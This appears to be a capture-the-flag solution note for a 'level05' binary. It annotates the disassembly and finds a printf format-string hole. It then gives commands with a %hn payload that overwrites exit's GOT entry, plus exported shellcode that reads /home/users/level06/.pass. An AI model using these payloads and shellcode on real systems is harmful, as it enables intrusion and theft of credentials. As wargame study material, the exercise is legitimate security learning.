stack :
esp					: ebp - 144 = 0x90
i2					:	esp + 0x1c - esp + 0x20
buffer[100]	: esp + 0x28 - esp + 0x8c
i						: esp + 0x8c - esp + 0x90

ebp


main:
0x08048444 <+0>:	push   %ebp
0x08048445 <+1>:	mov    %esp,%ebp
0x08048447 <+3>:	push   %edi
0x08048448 <+4>:	push   %ebx
0x08048449 <+5>:	and    $0xfffffff0,%esp
0x0804844c <+8>:	sub    $0x90,%esp; 144

0x08048452 <+14>:	movl   $0x0,0x8c(%esp) ; i = 0;
0x0804845d <+25>:	mov    0x80497f0,%eax ; stdin
0x08048462 <+30>:	mov    %eax,0x8(%esp)
0x08048466 <+34>:	movl   $0x64,0x4(%esp)
0x0804846e <+42>:	lea    0x28(%esp),%eax
0x08048472 <+46>:	mov    %eax,(%esp)
0x08048475 <+49>:	call   0x8048350 <fgets@plt> fgets(buffer, 100, stdin);
0x0804847a <+54>:	movl   $0x0,0x8c(%esp) ; i = 0;
0x08048485 <+65>:	jmp    0x80484d3 <main+143>

do
		0x08048487 <+67>:	lea    0x28(%esp),%eax ; eax = buffer;
		0x0804848b <+71>:	add    0x8c(%esp),%eax ; eax = buffer + i
		0x08048492 <+78>:	movzbl (%eax),%eax ; eax = buffer[i]
		0x08048495 <+81>:	cmp    $0x40,%al
		0x08048497 <+83>:	jle    0x80484cb <main+135>
		if (buffer[i] >= 'A')
			0x08048499 <+85>:	lea    0x28(%esp),%eax
			0x0804849d <+89>:	add    0x8c(%esp),%eax
			0x080484a4 <+96>:	movzbl (%eax),%eax ; eax = buffer[i]
			0x080484a7 <+99>:	cmp    $0x5a,%al
			0x080484a9 <+101>:	jg     0x80484cb <main+135>
			if (buffer[i] <= 'Z')
				0x080484ab <+103>:	lea    0x28(%esp),%eax
				0x080484af <+107>:	add    0x8c(%esp),%eax
				0x080484b6 <+114>:	movzbl (%eax),%eax ;eax = buffer[i];
				0x080484b9 <+117>:	mov    %eax,%edx ; edx = buffer[i]
				0x080484bb <+119>:	xor    $0x20,%edx ; edx = buffer[i] ^ 0x20
				0x080484be <+122>:	lea    0x28(%esp),%eax
				0x080484c2 <+126>:	add    0x8c(%esp),%eax ; eax = buffer + i
				0x080484c9 <+133>:	mov    %dl,(%eax) ; buffer[i] = buffer[i] ^ 0x20
		0x080484cb <+135>:	addl   $0x1,0x8c(%esp) ; i++;
	0x080484d3 <+143>:	mov    0x8c(%esp),%ebx ; ebx = i
	0x080484da <+150>:	lea    0x28(%esp),%eax ; eax = buffer;
	0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp) ; i2 = -1
	0x080484e6 <+162>:	mov    %eax,%edx
	0x080484e8 <+164>:	mov    $0x0,%eax
	0x080484ed <+169>:	mov    0x1c(%esp),%ecx
	0x080484f1 <+173>:	mov    %edx,%edi
	0x080484f3 <+175>:	repnz scas %es:(%edi),%al ; al = 0, edi = buffer,ecx = -1
	0x080484f5 <+177>:	mov    %ecx,%eax
	0x080484f7 <+179>:	not    %eax
	0x080484f9 <+181>:	sub    $0x1,%eax ; eax = strlen(buffer);
	0x080484fc <+184>:	cmp    %eax,%bx
		if (strlen(buffer) < i)
			0x080484fe <+186>:	jb     0x8048487 <main+67>
	} while (strlen(buffer) < i)


0x08048500 <+188>:	lea    0x28(%esp),%eax
0x08048504 <+192>:	mov    %eax,(%esp)
0x08048507 <+195>:	call   0x8048340 <printf@plt> printf(buffer)

0x0804850c <+200>:	movl   $0x0,(%esp)
0x08048513 <+207>:	call   0x8048370 <exit@plt> ; exit(0)

adresse de exit dans la plt : 0x0804a00c

adresse à réécrire : 0x80497e0

\xe0\x97\x04\x08
\xe2\x97\x04\x08

\xe0\x97\x04\x08 + \xe2\x97\x04\x08 + %056503x + %h$10n

gdb /home/users/level05/level05 -ex "set args < <(python -c \"print '\xe0''\x97''\x04''\x08' + '\xe2''\x97''\x04''\x08'+ '%049108x' + '%10\\\$hn' + '%016419x' + '%11\\\$hn'\")"
/home/users/level05/level05  < <(python -c "print '\xe0''\x97''\x04''\x08' + '\xe2''\x97''\x04''\x08'+ '%049108x' + '%10\$hn' + '%016419x' + '%11\$hn'")

\xdc\xbf    \xff\xff
e0					e2
bfdc : 49116
ffff : 65535

ffff - bfdc = 16419

export BINSH=`python -c "print '\x90' * 10000 + '\xeb''\x2d''\x31''\xc0''\xb0''\x05''\x5b''\x31''\xc9''\x31''\xd2''\x66''\xba''\xff''\x01''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\x31''\xc0''\xb0''\x03''\x31''\xd2''\xb2''\x29''\xcd''\x80''\x89''\xc2''\x31''\xc0''\xb0''\x04''\x31''\xdb''\xb3''\x01''\xcd''\x80''\xc3''\xe8''\xce''\xff''\xff''\xff''\x2f''\x68''\x6f''\x6d''\x65''\x2f''\x75''\x73''\x65''\x72''\x73''\x2f''\x6c''\x65''\x76''\x65''\x6c''\x30''\x36''\x2f''\x2e''\x70''\x61''\x73''\x73'"`
